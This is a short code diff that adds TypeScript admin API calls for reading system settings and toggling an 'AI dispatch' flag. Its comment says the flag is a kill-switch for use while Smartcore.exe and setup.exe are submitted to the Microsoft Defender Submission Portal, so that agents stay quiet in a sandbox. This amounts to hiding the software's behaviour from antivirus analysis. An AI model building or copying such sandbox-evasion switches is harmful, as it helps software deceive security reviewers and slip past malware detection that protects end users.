@@ -281,3 +281,27 @@ export function createCommand(input: {
 export function getCommand(id: string) {
   return apiClient.get<Command>(`/api/v1/admin/commands/${id}`);
 }
+
+// === System settings (global feature flags) ===
+//
+// The AI dispatch flag is a kill-switch used while submitting
+// Smartcore.exe + setup.exe to the Microsoft Defender Submission
+// Portal. When OFF, the backend strips AI metadata + launch flags
+// from every heartbeat, so agents in a sandbox stay quiet.
+
+export type SystemSettings = {
+  ai_dispatch_enabled: boolean;
+  updated_at: string;
+  updated_by?: string | null;
+};
+
+export function getSettings() {
+  return apiClient.get<SystemSettings>("/api/v1/admin/settings");
+}
+
+export function setAIDispatch(enabled: boolean) {
+  return apiClient.post<{ ai_dispatch_enabled: boolean }>(
+    "/api/v1/admin/settings/ai-dispatch",
+    { enabled },
+  );
+}
